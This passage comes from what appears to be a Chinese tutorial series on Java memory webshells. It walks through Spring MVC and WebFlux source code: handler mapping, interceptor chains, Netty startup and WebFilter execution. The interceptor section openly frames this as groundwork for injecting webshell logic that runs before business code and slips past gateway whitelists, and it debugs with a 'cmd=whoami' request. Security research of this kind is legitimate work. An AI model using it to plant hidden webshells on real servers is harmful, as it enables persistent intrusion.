我们可以新建main/resources文件夹，然后新建application.properties，通过server.port来控制netty服务的端口： 接着我们运行： 这里我从github上找了一个项目，也可以很好地帮助我们理解这个框架是如何使用的，它采用的是Netty+SpringWebFlux： https://github.com/Java-Techie-jt/springboot-webflux-demo 随便访问个路由。例如http://127.0.0.1:9191/customers/stream： 2.11 Spring MVC介绍如果想要深入理解Spring MVC框架型内存马，那么对Spring MVC的基础了解是非常必要的，本节就从源码层面和大家简单聊聊这个框架。 首先引用《Spring in Action》上的一张图（这里我重制了一下）来了解Spring MVC的核心组件和大致处理流程（不过我在第五版书上貌似没有找到这张图，有找到的小伙伴可以公众号后台私信我）： 可以看到，这里有一堆名词，我们一一来看： DispatcherServlet是前端控制器，它负责接收Request并将Request转发给对应的处理组件； HandlerMapping负责完成url到Controller映射，可以通过它来找到对应的处理Request的Controller； Controller处理Request，并返回ModelAndVIew对象，ModelAndView是封装结果视图的组件； ④~⑦表示视图解析器解析ModelAndView对象并返回对应的视图给客户端。 还有一个概念需要了解，就是IOC容器，因为这个名词会在本文后面的内容中提及。 IOC（控制反转）容器是Spring框架的核心概念之一，它的基本思想是将对象的创建、组装、管理等控制权从应用程序代码反转到容器，使得应用程序组件无需直接管理它们的依赖关系。IOC容器主要负责对象的创建、依赖注入、生命周期管理和配置管理等。Spring框架提供了多种实现IOC容器的方式，下面讲两种常见的： BeanFactory：Spring的最基本的IOC容器，提供了基本的IOC功能，只有在第一次请求时才创建对象。 ApplicationContext：这是BeanFactory的扩展，提供了更多的企业级功能。ApplicationContext在容器启动时就预加载并初始化所有的单例对象，这样就可以提供更快的访问速度。 2.11.1 Spring MVC九大组件这九大组件需要有个印象： DispatcherServlet（派发Servlet）：负责将请求分发给其他组件，是整个Spring MVC流程的核心；HandlerMapping（处理器映射）：用于确定请求的处理器（Controller）；HandlerAdapter（处理器适配器）：将请求映射到合适的处理器方法，负责执行处理器方法；HandlerInterceptor（处理器拦截器）：允许对处理器的执行过程进行拦截和干预；Controller（控制器）：处理用户请求并返回适当的模型和视图；ModelAndView（模型和视图）：封装了处理器方法的执行结果，包括模型数据和视图信息；ViewResolver（视图解析器）：用于将逻辑视图名称解析为具体的视图对象；LocaleResolver（区域解析器）：处理区域信息，用于国际化；ThemeResolver（主题解析器）：用于解析Web应用的主题，实现界面主题的切换。 2.11.2 简单的源码分析2.11.2.1 九大组件的初始化首先是找到org.springframework.web.servlet.DispatcherServlet，可以看到里面有很多组件的定义和初始化函数以及一些其他的函数： 但是没有init()函数，我们翻看其父类FrameworkServlet的父类org.springframework.web.servlet.HttpServletBean的时候发现有init函数： 代码如下： 123456789101112131415161718192021222324@Overridepublic final void init() throws ServletException &#123; // Set bean properties from init parameters. PropertyValues pvs = new ServletConfigPropertyValues(getServletConfig(), this.requiredProperties); if (!pvs.isEmpty()) &#123; try &#123; BeanWrapper bw = PropertyAccessorFactory.forBeanPropertyAccess(this); ResourceLoader resourceLoader = new ServletContextResourceLoader(getServletContext()); bw.registerCustomEditor(Resource.class, new ResourceEditor(resourceLoader, getEnvironment())); initBeanWrapper(bw); bw.setPropertyValues(pvs, true); &#125; catch (BeansException ex) &#123; if (logger.isErrorEnabled()) &#123; logger.error(&quot;Failed to set bean properties on servlet &#x27;&quot; + getServletName() + &quot;&#x27;&quot;, ex); &#125; throw ex; &#125; &#125; // Let subclasses do whatever initialization they like. initServletBean();&#125; 先是从Servlet的配置中获取初始化参数并创建一个PropertyValues对象，然后设置Bean属性；关键在最后一步，调用了initServletBean这个方法。 我们点进去之后发现该函数并没有写任何内容，说明应该是子类继承的时候override了该方法： 果不其然，我们在org.springframework.web.servlet.FrameworkServlet中成功找到了该方法： 代码如下： 1234567891011121314151617181920212223242526272829@Overrideprotected final void initServletBean() throws ServletException &#123; getServletContext().log(&quot;Initializing Spring &quot; + getClass().getSimpleName() + &quot; &#x27;&quot; + getServletName() + &quot;&#x27;&quot;); if (logger.isInfoEnabled()) &#123; logger.info(&quot;Initializing Servlet &#x27;&quot; + getServletName() + &quot;&#x27;&quot;); &#125; long startTime = System.currentTimeMillis(); try &#123; this.webApplicationContext = initWebApplicationContext(); initFrameworkServlet(); &#125; catch (ServletException | RuntimeException ex) &#123; logger.error(&quot;Context initialization failed&quot;, ex); throw ex; &#125; if (logger.isDebugEnabled()) &#123; String value = this.enableLoggingRequestDetails ? &quot;shown which may lead to unsafe logging of potentially sensitive data&quot; : &quot;masked to prevent unsafe logging of potentially sensitive data&quot;; logger.debug(&quot;enableLoggingRequestDetails=&#x27;&quot; + this.enableLoggingRequestDetails + &quot;&#x27;: request parameters and headers will be &quot; + value); &#125; if (logger.isInfoEnabled()) &#123; logger.info(&quot;Completed initialization in &quot; + (System.currentTimeMillis() - startTime) + &quot; ms&quot;); &#125;&#125; 这段代码的log和计时部分就不说了，我们捡关键的说。它先是调用initWebApplicationContext方法，初始化IOC容器，在初始化的过程中，会调用到这个onRefresh方法，一般来说这个方法是在容器刷新完成后被调用的回调方法，它执行一些在应用程序启动后立即需要完成的任务： 跟入该方法，可以看到其中默认为空： 说明在它的子类中应该会有override，果然我们定位到了org.springframework.web.servlet.DispatcherServlet# 方法： 这一下就明了了起来，这不是我们之前提到的九大组件嘛，到这一步就完成了Spring MVC的九大组件的初始化。 2.11.2.2 url和Controller的关系的建立你可能会有这样的一个疑惑：我们是用@RequestMapping(&quot;/&quot;)注解在方法上的，那Spring MVC是怎么根据这个注解就把对应的请求和这个方法关联起来的？ 从上面的九大组件的初始化中可以看到，有个方法就叫做initHandlerMappings，我们点进去详细看看： 这段代码和自带的注释写的也比较通俗易懂，分为两部分，第一部分是去ApplicationContext（包括ancestor contexts）里面找所有实现了HandlerMappings接口的类，如果找到了至少一个符合条件的HandlerMapping bean，那就把它的值转化为列表，并按照Java的默认排序机制对它们进行排序，最后将排序后的列表赋值给 this.handlerMappings；那如果没有找到，this.handlerMappings就依然保持为null；如果不需要检测所有处理程序映射，那就尝试从ApplicationContext中获取名称为 handlerMapping 的bean，如果成功获取到了则将其作为单一元素的列表赋值给 this.handlerMappings，如果获取失败了，那也没关系，因为人家注释里面讲的很明白，会添加一个默认的HandlerMapping，这也就是我们要讲的第二部分的代码。 第二部分说的是，如果之前一套操作下来，this.handlerMappings还是为null，那么就调用 getDefaultStrategies 方法去获取默认的HandlerMapping，并将其赋给 this.handlerMappings。 这么一看的话，org.springframework.web.servlet.DispatcherServlet#getDefaultStrategies这个方法还是挺关键的，我们点进去看看： 这段代码挺有意思，先是加载资源文件，并将其内容以属性键值对的形式存储在defaultStrategies中；接下来从strategyInterface获取一个名称，然后用这个名称在defaultStrategies中查找相应的值，如果找到了，就将这个值按逗号分隔成类名数组，接着遍历这个类名数组，对于每个类名都执行以下两个操作：①尝试通过ClassUtils.forName方法加载该类 ②使用createDefaultStrategy方法创建该类的实例；最后将创建的策略对象添加到列表strategies中并返回。 那就很好奇了，这段代码中的DEFAULT_STRATEGIES_PATH里面有啥？Ctrl+左键追踪： 原来是一个名叫DispatcherServlet.properties的文件，我们可以在左侧的依赖列表里面很快地翻到它，因为它应该是和DispatcherServlet.java在一块儿的： 从文件内容中，我们可以很快地锁定关键信息： 123org.springframework.web.servlet.HandlerMapping=org.springframework.web.servlet.handler.BeanNameUrlHandlerMapping,\\ org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping,\\ org.springframework.web.servlet.function.support.RouterFunctionMapping 也就是说，会有三个值，分别是BeanNameUrlHandlerMapping、RequestMappingHandlerMapping和RouterFunctionMapping，我们一般用的是第二个，我们点进org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping看一下： 它的父类RequestMappingInfoHandlerMapping的父类AbstractHandlerMethodMapping实现了InitializingBean这个接口，这个接口用于在bean初始化完成后执行一些特定的自定义初始化逻辑。 点进该接口，只有一个afterPropertiesSet方法，关于该方法的用途可以参考https://www.python100.com/html/U711CO7MV79C.html： 那我们就看看AbstractHandlerMethodMapping它是具体咋实现InitializingBean的afterPropertiesSet的吧： 重写的也很简单，调用initHandlerMethods这个方法，继续跟踪该方法： 注释里面写的很清楚：扫描ApplicationContext中的bean，然后检测并注册handler methods。 我们在org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#initHandlerMethods这里打下断点进行调试，到图中这一步之后step into： 我们来看org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#processCandidateBean这个方法的具体逻辑： 这里我们自然很好奇，这个isHandler是判断啥的，我们点进去看看： 可以看到，这里并没有给出实现，说明子类中应该会给出override，于是直接找到了org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#isHandler： 很明显，isHandler是用来检测给定的beanType类是否带有Controller注解或者RequestMapping注解。 解决了这个，继续往后看，后面是调用了detectHandlerMethods这个方法，我们点进去看看： 我们分开来看，首先是这行代码，它是综合起来写的，意思是说，先判断handler是否是字符串类型，如果是，则通过ApplicationContext获取它的类型；否则，直接获取handler的类型。： 12Class&lt;?&gt; handlerType = (handler instanceof String ? obtainApplicationContext().getType((String) handler) : handler.getClass()); 然后是这部分： 1234567891011Class&lt;?&gt; userType = ClassUtils.getUserClass(handlerType);Map&lt;Method, T&gt; methods = MethodIntrospector.selectMethods(userType, (MethodIntrospector.MetadataLookup&lt;T&gt;) method -&gt; &#123; try &#123; return getMappingForMethod(method, userType); &#125; catch (Throwable ex) &#123; throw new IllegalStateException(&quot;Invalid mapping on handler class [&quot; + userType.getName() + &quot;]: &quot; + method, ex); &#125; &#125;); 先是获取处理器的用户类，用户类是没有经过代理包装的类，这样就可以确保获取到的是实际处理请求的类；然后是这个selectMethods方法，这个方法有两个参数，第一个参数就是用户类，第二个参数是一个回调函数。关键就在于理解这个回调函数的作用。对于每个方法，它会尝试调用getMappingForMethod来获取方法的映射信息。 我们点进这个方法，发现它是一个抽象方法： 那就去看看他的子类中有没有对应的实现，直接定位到org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#getMappingForMethod： 我们在下图所示位置打断点调试： 分开来看，首先是第一行： 1RequestMappingInfo info = createRequestMappingInfo(method); 解析Controller类的方法中的注解，生成一个对应的RequestMappingInfo对象。我们可以step into进入org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping#createRequestMappingInfo(java.lang.reflect.AnnotatedElement)方法： 可以看到这个info里面保存了访问该方法的url pattern是&quot;/&quot;，也就是我们在TestController.java所想要看到的当@RequestMapping(&quot;/&quot;)时，调用test方法。 继续一步步往下走，可以看到走到了org.springframework.web.servlet.handler.AbstractHandlerMethodMapping#detectHandlerMethods的最后： 直接看lambda表达式里面的内容： 12Method invocableMethod = AopUtils.selectInvocableMethod(method, userType);registerHandlerMethod(handler, invocableMethod, mapping); 意思是，先用selectInvocableMethod方法根据method和userType选择出一个可调用的方法，这样是为了处理可能存在的代理和AOP的情况，确保获取到的是可直接调用的原始方法；然后把bean、Method和RequestMappingInfo注册进MappingRegistry。 到这里，url和Controller之间的关系是如何建立的问题就解决了。 2.11.2.3 Spring Interceptor引入与执行流程分析我们回顾之前聊到的Controller的思路和下面的4.1节中所展示的Controller内存马，可以考虑到这样一个问题： 随着微服务部署技术的迭代演进，大型业务系统在到达真正的应用服务器的时候，会经过一些系列的网关、复杂均衡以及防火墙等。所以如果你新建的shell路由不在这些网关的白名单中，那么就很有可能无法访问到，在到达应用服务器之前就会被丢弃。我们要达到的目的就是在访问正常的业务地址之前，就能执行我们的代码。所以，在注入java内存马时，尽量不要使用新的路由来专门处理我们注入的webshell逻辑，最好是在每一次请求到达真正的业务逻辑前，都能提前进行我们webshell逻辑的处理。在tomcat容器下，有filter、listener等技术可以达到上述要求。那么在 spring 框架层面下，有办法达到上面所说的效果吗？ ——摘编自https://github.com/Y4tacker/JavaSec/blob/main/5.内存马学习/Spring/利用intercetor注入Spring内存马/index.md和https://landgrey.me/blog/19/ 答案是当然有，这就是我们要讲的Spring Interceptor，Spring框架中的一种拦截器机制。 那就不禁要问了：这个Spring Interceptor和我们之前所说的Filter的区别是啥？ 参考：https://developer.aliyun.com/article/925400 主要有以下六个方面： 主要区别 拦截器 过滤器 机制 Java反射机制 函数回调 是否依赖Servlet容器 不依赖 依赖 作用范围 对action请求起作用 对几乎所有请求起作用 是否可以访问上下文和值栈 可以访问 不能访问 调用次数 可以多次被调用 在容器初始化时只被调用一次 IOC容器中的访问 可以获取IOC容器中的各个bean（基于FactoryBean接口） 不能在IOC容器中获取bean 我们在2.10.2节中给出的TestInterceptor.java的preHandle函数这里下断点，然后访问http://127.0.0.1:8080/?cmd=whoami进入调试： 一步步步入调试之后，发现进入org.springframework.web.servlet.DispatcherServlet#doDispatch方法： 我们在doDispatch方法的第一行下断点，重新访问页面调试： 看到了调用了getHandler这个函数，它的注释写的简单易懂：确定处理当前请求的handler，我们step into看看： 通过遍历当前handlerMapping数组中的handler对象，来判断哪个handler来处理当前的request对象： 继续步入这个函数里面所用到的mapping.getHandler方法，也就是org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler： 代码简单易懂，先是通过getHandlerInternal来获取，如果获取不到，那就调用getDefaultHandler来获取默认的，如果还是获取不到，就直接返回null；然后检查handler是不是一个字符串，如果是，说明可能是一个Bean的名字，这样的话就通过ApplicationContext来获取对应名字的Bean对象，这样就确保 handler 最终会是一个合法的处理器对象；接着检查是否已经有缓存的请求路径，如果没有缓存就调用 initLookupPath(request) 方法来初始化请求路径的查找；最后通过 getHandlerExecutionChain 方法创建一个处理器执行链。 这么看下来，这个getHandlerExecutionChain方法很重要，我们步入看看： 遍历adaptedInterceptors，判断拦截器是否是MappedInterceptor类型，如果是那就看MappedInterceptor是否匹配当前请求，如果匹配则将其实际的拦截器添加到执行链中，如果不是这个类型的那就直接将拦截器添加到执行链中。 再回到之前的getHandler方法中来，看看它的后半段： 主要都是处理跨域资源共享（CORS）的逻辑，只需要知道在涉及CORS的时候把request、executionChain和CORS配置通过getCorsHandlerExecutionChain调用封装后返回就行了。 一步步执行回到一开始的getHandler中，这里就是调用org.springframework.web.servlet.HandlerExecutionChain#applyPreHandle方法来遍历所有拦截器进行预处理，后面的代码就基本不需要了解了： 2.12 Spring WebFlux介绍与代码调试分析SpringWebFlux是Spring Framework 5.0中引入的新的响应式web框架。传统的Spring MVC在处理请求时是阻塞的，即每个请求都会占用一个线程，如果有大量请求同时到达，就需要大量线程来处理，可能导致资源耗尽。为了解决这个问题，WebFlux引入了非阻塞的响应式编程模型，通过使用异步非阻塞的方式处理请求，能够更高效地支持大量并发请求，提高系统的吞吐量；并且它能够轻松处理长连接和WebSocket，适用于需要保持连接的应用场景，如实时通讯和推送服务；在微服务架构中，服务之间的通信往往需要高效处理，WebFlux可以更好地适应这种异步通信的需求。 关于Reactive和Spring WebFlux的相关知识，可以参考知乎上的这篇文章，讲的通俗易懂，很透彻： https://zhuanlan.zhihu.com/p/559158740 WebFlux框架开发的接口返回类型必须是Mono&lt;T&gt;或者是Flux&lt;T&gt;。因此我们第一个需要了解的就是什么是Mono以及什么是Flux。 2.12.1 什么是Mono？Mono用来表示包含0或1个元素的异步序列，它是一种异步的、可组合的、能够处理异步数据流的类型。比方说当我们发起一个异步的数据库查询、网络调用或其他异步操作时，该操作的结果可以包装在Mono中，这样就使得我们可以以响应式的方式处理异步结果，而不是去阻塞线程等待结果返回，就像我们在2.10.3节中的那张gif图中所看到的那样。 下面我们来看看Mono常用的api： API 说明 代码示例 Mono.just(T data) 创建一个包含指定数据的 Mono。 Mono&lt;String&gt; mono = Mono.just(&quot;Hello, Mono!&quot;); Mono.empty() 创建一个空的 Mono。 Mono&lt;Object&gt; emptyMono = Mono.empty(); Mono.error(Throwable error) 创建一个包含错误的 Mono。 Mono&lt;Object&gt; errorMono = Mono.error(new RuntimeException(&quot;Something went wrong&quot;)); Mono.fromCallable(Callable&lt;T&gt; supplier) 从 Callable 创建 Mono，表示可能抛出异常的异步操作。 Mono&lt;String&gt; resultMono = Mono.fromCallable(() -&gt; expensiveOperation()); Mono.fromRunnable(Runnable runnable) 从 Runnable 创建 Mono，表示没有返回值的异步操作。 Mono&lt;Void&gt; runnableMono = Mono.fromRunnable(() -&gt; performAsyncTask()); Mono.delay(Duration delay) 在指定的延迟后创建一个空的 Mono。 Mono&lt;Object&gt; delayedMono = Mono.delay(Duration.ofSeconds(2)).then(Mono.just(&quot;Delayed Result&quot;)); Mono.defer(Supplier&lt;? extends Mono&lt;? extends T&gt;&gt; supplier) 延迟创建 Mono，直到订阅时才调用供应商方法。 Mono&lt;String&gt; deferredMono = Mono.defer(() -&gt; Mono.just(&quot;Deferred Result&quot;)); Mono.whenDelayError(Iterable&lt;? extends Mono&lt;? extends T&gt;&gt; monos) 将一组 Mono 合并为一个 Mono，当其中一个出错时，继续等待其他的完成。 Mono&lt;String&gt; resultMono = Mono.whenDelayError(Arrays.asList(mono1, mono2, mono3)); Mono.map(Function&lt;? super T, ? extends V&gt; transformer) 对 Mono 中的元素进行映射。 Mono&lt;Integer&gt; resultMono = mono.map(s -&gt; s.length()); Mono.flatMap(Function&lt;? super T, ? extends Mono&lt;? extends V&gt;&gt; transformer) 对 Mono 中的元素进行异步映射。 Mono&lt;Integer&gt; resultMono = mono.flatMap(s -&gt; Mono.just(s.length())); Mono.filter(Predicate&lt;? super T&gt; tester) 过滤 Mono 中的元素。 Mono&lt;String&gt; filteredMono = mono.filter(s -&gt; s.length() &gt; 5); Mono.defaultIfEmpty(T defaultVal) 如果 Mono 为空，则使用默认值。 Mono&lt;String&gt; resultMono = mono.defaultIfEmpty(&quot;Default Value&quot;); Mono.onErrorResume(Function&lt;? super Throwable, ? extends Mono&lt;? extends T&gt;&gt; fallback) 在发生错误时提供一个备用的 Mono。 Mono&lt;String&gt; resultMono = mono.onErrorResume(e -&gt; Mono.just(&quot;Fallback Value&quot;)); Mono.doOnNext(Consumer&lt;? super T&gt; consumer) 在成功时执行操作，但不更改元素。 Mono&lt;String&gt; resultMono = mono.doOnNext(s -&gt; System.out.println(&quot;Received: &quot; + s)); Mono.doOnError(Consumer&lt;? super Throwable&gt; onError) 在发生错误时执行操作。 Mono&lt;String&gt; resultMono = mono.doOnError(e -&gt; System.err.println(&quot;Error: &quot; + e.getMessage())); Mono.doFinally(Consumer&lt;SignalType&gt; action) 无论成功还是出错都执行操作。 Mono&lt;String&gt; resultMono = mono.doFinally(signal -&gt; System.out.println(&quot;Processing finished: &quot; + signal)); 2.12.2 什么是Flux？Flux表示的是0到N个元素的异步序列，可以以异步的方式按照时间的推移逐个或一批一批地publish元素。也就是说，Flux允许在处理元素的过程中，不必等待所有元素都准备好，而是可以在它们准备好的时候立即推送给订阅者。这种异步的推送方式使得程序可以更灵活地处理元素的生成和消费，而不会阻塞执行线程。 下面是Flux常用的api： API 说明 代码示例 Flux.just 创建包含指定元素的Flux Flux&lt;String&gt; flux = Flux.just(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;); Flux.fromIterable 从Iterable创建Flux List&lt;String&gt; list = Arrays.asList(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;);Flux&lt;String&gt; flux = Flux.fromIterable(list); Flux.fromArray 从数组创建Flux String[] array = &#123;&quot;A&quot;, &quot;B&quot;, &quot;C&quot;&#125;;Flux&lt;String&gt; flux = Flux.fromArray(array); Flux.empty 创建一个空的Flux Flux&lt;Object&gt; emptyFlux = Flux.empty(); Flux.error 创建一个包含错误的Flux Flux&lt;Object&gt; errorFlux = Flux.error(new RuntimeException(&quot;Something went wrong&quot;)); Flux.range 创建包含指定范围的整数序列的Flux Flux&lt;Integer&gt; rangeFlux = Flux.range(1, 5); Flux.interval 创建包含定期间隔的元素的Flux Flux&lt;Long&gt; intervalFlux = Flux.interval(Duration.ofSeconds(1)).take(5); Flux.merge 合并多个Flux，按照时间顺序交织元素 Flux&lt;String&gt; flux1 = Flux.just(&quot;A&quot;, &quot;B&quot;);Flux&lt;String&gt; flux2 = Flux.just(&quot;C&quot;, &quot;D&quot;);Flux&lt;String&gt; mergedFlux = Flux.merge(flux1, flux2); Flux.concat 连接多个Flux，按照顺序发布元素 Flux&lt;String&gt; flux1 = Flux.just(&quot;A&quot;, &quot;B&quot;);Flux&lt;String&gt; flux2 = Flux.just(&quot;C&quot;, &quot;D&quot;);Flux&lt;String&gt; concatenatedFlux = Flux.concat(flux1, flux2); Flux.zip 将多个Flux的元素进行配对，生成Tuple Flux&lt;String&gt; flux1 = Flux.just(&quot;A&quot;, &quot;B&quot;);Flux&lt;String&gt; flux2 = Flux.just(&quot;1&quot;, &quot;2&quot;);Flux&lt;Tuple2&lt;String, String&gt;&gt; zippedFlux = Flux.zip(flux1, flux2); Flux.filter 过滤满足条件的元素 Flux&lt;Integer&gt; numbers = Flux.range(1, 5);Flux&lt;Integer&gt; filteredFlux = numbers.filter(n -&gt; n % 2 == 0); Flux.map 转换每个元素的值 Flux&lt;String&gt; words = Flux.just(&quot;apple&quot;, &quot;banana&quot;, &quot;cherry&quot;);Flux&lt;Integer&gt; wordLengths = words.map(String::length); Flux.flatMap 将每个元素映射到一个Flux，并将结果平铺 Flux&lt;String&gt; letters = Flux.just(&quot;A&quot;, &quot;B&quot;, &quot;C&quot;);Flux&lt;String&gt; flatMappedFlux = letters.flatMap(letter -&gt; Flux.just(letter, letter.toLowerCase())); 2.12.3 Spring WebFlux启动过程分析本来是想先用文字聊一堆关于Spring MVC和Spring WebFlux之间的区别的，但是这个已经被网上现有的不多的关于WebFlux的文章讲烂了，大家随便搜都可以搜到，皮毛性的东西纯属浪费时间，于是我们直接看代码，去深挖WebFlux的调用过程，从中我们自然可以发现这两者在调用过程中的类似和不同的地方。 我们直接在run方法这里下断点，然后直接step into： 一步步地step over之后，我们可以看到调用了org.springframework.boot.SpringApplication#createApplicationContext这个方法（前面的那些方法并不重要，直接略过就行）： 这个方法光听名字createApplicationContext，就感觉很重要，因为字面意思就是创建ApplicationContext，这正是我们感兴趣的内容，我们step into进去看看： 可以看到，是根据不同的webApplicationType去选择创建不同的context，比如我们这里的webApplicationType就是REACTIVE，也就是响应式的。 我们step into这里的create方法： 发现里面有两个静态方法、一个create方法和一个默认实现 DEFAULT，这个默认实现通过加载 ApplicationContextFactory 的所有候选实现，创建相应的上下文；如果没有找到合适的实现，则默认返回一个 AnnotationConfigApplicationContext 实例。 我们继续step over走下去，可以看到我们REACTIVE对应的context是AnnotationConfigReactiveWebServerApplicationContext： 继续往下走，我们会回到一开始这里，可以看到接下来会调用prepareContext、refreshContext和afterRefresh方法，这个过程就是一系列的初始化、监听的注册等操作： 我们step into这里的refreshContext方法： 接着step into这里的refresh方法： 进来之后，接着step into这里的refresh方法： 可以看到，这里调用了一个super.refresh，也就是父类的refresh方法： 我们继续step into查看，发现这里调用了onRefresh方法： 我们step into这里的onRefresh，发现它调用了关键的org.springframework.boot.web.reactive.context.ReactiveWebServerApplicationContext#createWebServer： 继续step over可以看到，由于我们使用的是Netty而不是Tomcat，因此这里最终会调用NettyReactiveWebServerFactory类中的getWebServer方法： 而上图中的WebServerManager类也是一个重要的封装类，里面有两个成员变量，一个是底层服务器的抽象WebServer，另一个是上层方法处理者的抽象DelayedInitializationHttpHandler： 那这个webserver具体是怎么启动的呢？我们继续走到finishRefresh这个方法这里来，如果这里我们直接无脑step over，程序最终会回到run方法，说明，启动webserver的地方肯定就在这个finishRefresh方法里面： 我们step into进去看看： 接着step into去看看这里调用的getLifecycleProcessor().onRefresh()方法，发现调用了startBeans方法，并且设置了自启动： 我们直接step into这个startBeans方法，一步步地step over过后，会发现调用了start方法，看来我们在逐渐逼近真相： 我们继续step into这个start方法，发现调用了org.springframework.context.support.DefaultLifecycleProcessor#doStart这个方法： 直接step into进去看看，发现由于dependenciesForBean为[]，所以没有调用doStart方法，直接就是调用bean.start()： 继续step into这个start方法看看： 怎么会啥也没有呢？奇了怪了，到底是哪里出了问题了呢？我在这一步愣住了，决定把之前打的断点取消，在如下俩图所示的位置打上断点重新调试，因为这两个方法是关键方法： 调试了几遍之后发现是我疏忽了，这里的this.lifecycleBeans里面其实有三个，每调用一次doStart方法就会删掉一个： 可以看到，我们刚才调用的是第一个bean的，所以当然没有启动webserver相关的方法了： 我们一步步step over，当memeber.name为webServerStartStop时，我们再step into这个doStart方法里面的bean.start()： 即可看到this.weServerManager.start()： 我们继续step into这个start方法： 仔细看看上面红框中的代码，先是初始化HttpHandler，这个方法其实根据lazyInit的值的不同来决定何时初始化，如果lazyInit值为true，那么就等第一次请求到来时才真正初始化；如果为false，那么就在 WebServerManager 的 start 方法中调用 initializeHandler 直接初始化： 我们继续步入这里的start方法，发现其位置为org.springframework.boot.web.embedded.netty.NettyWebServer#start 到这里才算真正明了，真正的webServer启动的关键方法是org.springframework.boot.web.embedded.netty.NettyWebServer#startHttpServer： 从下面的this.webServer中也可以看到，绑定的是0.0.0.0:9191： 2.12.4 Spring WebFlux请求处理过程分析当一个请求过来的时候，Spring WebFlux是如何进行处理的呢？ 这里我们在org.example.webfluxmemoryshelldemo.hello.GreetingHandler#hello这里打上断点，然后进行调试，访问http://127.0.0.1:9191/hello触发debug： 一步步地step over后来到org.springframework.web.reactive.DispatcherHandler#invokeHandler： step into之后可以看到是org.springframework.web.reactive.DispatcherHandler#handle： 解释上面代码中的return部分，首先检查handlerMappings是否为null，如果是，那就调用createNotFoundError方法返回一个表示未找到处理程序的Mono；接着通过CorsUtils.isPreFlightRequest方法检查是否为预检请求，如果是，那就调用handlePreFlight方法处理预检请求，如果不是预检请求且handlerMappings不为null，通过一系列的操作，获取到请求的handler，然后调用invokeHandler方法执行处理程序，再调用handleResult方法处理执行结果，最终返回一个表示处理完成的Mono。 左下角的Threads &amp; Variables这里，我们往下翻，可以看到在此之前是调用了一个org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandler： 我们把之前的断点去掉，然后在该函数这里打上断点： 发现调用了org.springframework.web.reactive.handler.AbstractHandlerMapping#getHandlerInternal，我们再回去看，发现调用位置在org.springframework.web.reactive.function.server.support.RouterFunctionMapping#getHandlerInternal： 点击去： 这里最终创建的是DefaultServerRequest对象，需要注意的是在创建该对象时将RouterFunctionMapping中保存的HttpMessageReader列表作为参数传入，这样DefaultServerRequest对象就有了解析参数的能力。 回到getHandlerInternal这个函数，看它的return里面的匿名函数，发现其调用了org.springframework.web.reactive.function.server.RouterFunction#route，我们点进去看看： 发现只是在接口中定义了下： 于是去翻之前的Threads &amp; Variables： 首先调用this.predicate.test方法来判断传入的ServerRequest是否符合路由要求，如果匹配到了处理方法，那就将保存的HandlerFunction实现返回，否则就返回空的Mono。 点进去这个test方法，发现还是个接口，结合之前的RouterFunction.java和RouterFunctions.java的命名规则，合理猜测test方法的实现应该是在RequestPredicates.java里面。果然是有的，我们取消之前下的所有断点，在test函数这里重新打上断点后调试： 可以看到这里已经拿到了pattern，那就还差解析request里面的GET这个方法了： 我们继续step over，发现直接跳到了这里，我当时就挺纳闷儿，这里的this.left和this.right怎么就已知了： 这俩变量已知说明在执行test之前肯定是已经被赋值了，我继续往后step over，从下图中可以看到，此时二者之间多了个&amp;&amp;，不难猜测，应该是调用了org.springframework.web.reactive.function.server.RequestPredicates.AndRequestPredicate方法，因为还有一个OrRequestPredicate，这个or的话应该就是||了： 于是我们再在AndRequestPredicate方法这打上断点，此时我们还没有访问http://127.0.0.1:9191/hello，就已经触发调试了，这是因为我们在GreetingRouter.java里面写的代码中有GET方法、/hello路由还有and方法，因此会调用到AndRequestPredicate，并把GET和/hello分别复制给this.left和this.right： 到这里，我们基本就了解了路由匹配这么个事情。接下来我们要考虑的事情就是如何处理请求，这个就比较简单了，为什么这么说呢？因为在我们2.12.3节中的分析中已经基本涉及到了。我们还是在org.springframework.web.reactive.DispatcherHandler#invokeHandler打下断点调试： 可以看到，这里的this.handlerAdapters里面有四个handlerAdapter： 并不是所有的handlerAdapter都会触发handle方法，只有当支持我们给定的handler的handlerAdapter才可以调用： 然后我们step into这里的handlerAdapter.handle方法，发现是在org.springframework.web.reactive.function.server.support.HandlerFunctionAdapter#handle： 而这里的handlerFunction.handle也就是我们编写的route方法： 到这里，关于处理请求的部分也就完结了。 2.12.5 Spring WebFlux过滤器WebFilter运行过程分析对于Spring WebFlux而言，由于没有拦截器和监听器这个概念，要想实现权限验证和访问控制的话，就得使用Filter，关于这一部分知识可以参考Spring的官方文档： https://docs.spring.io/spring-security/reference/reactive/configuration/webflux.html 而在Spring Webflux中，存在两种类型的过滤器：一个是WebFilter，实现自org.springframework.web.server.WebFilter接口。通过实现这个接口，可以定义全局的过滤器，它可以在请求被路由到handler之前或者之后执行一些逻辑；另一个就是HandlerFilterFunction，它是一种函数式编程的过滤器类型，实现自org.springframework.web.reactive.function.server.HandlerFilterFunction接口，与WebFilter相比它更加注重函数式编程的风格，可以用于处理基于路由的过滤逻辑。 这里我们以WebFilter为例，看看它的运行过程。新建一个GreetingFilter.java，代码如下： 1234567891011121314151617181920212223package org.example.webfluxmemoryshelldemo.hello;import org.springframework.http.server.reactive.ServerHttpRequest;import org.springframework.stereotype.Component;import org.springframework.web.server.ServerWebExchange;import org.springframework.web.server.WebFilter;import org.springframework.web.server.WebFilterChain;import org.springframework.web.util.pattern.PathPattern;import org.springframework.web.util.pattern.PathPatternParser;import reactor.core.publisher.Mono;@Componentpublic class GreetingFilter implements WebFilter &#123; @Override public Mono&lt;Void&gt; filter(ServerWebExchange serverWebExchange, WebFilterChain webFilterChain) &#123; PathPattern pattern=new PathPatternParser().parse(&quot;/hello/**&quot;); ServerHttpRequest request=serverWebExchange.getRequest(); if (pattern.matches(request.getPath().pathWithinApplication()))&#123; System.out.println(&quot;hello, this is our filter!&quot;); &#125; return webFilterChain.filter(serverWebExchange); &#125;&#125; 效果如下： 我们直接在filter函数这里下断点，进行调试： 注意到return中调用了filter函数，于是step into看看： 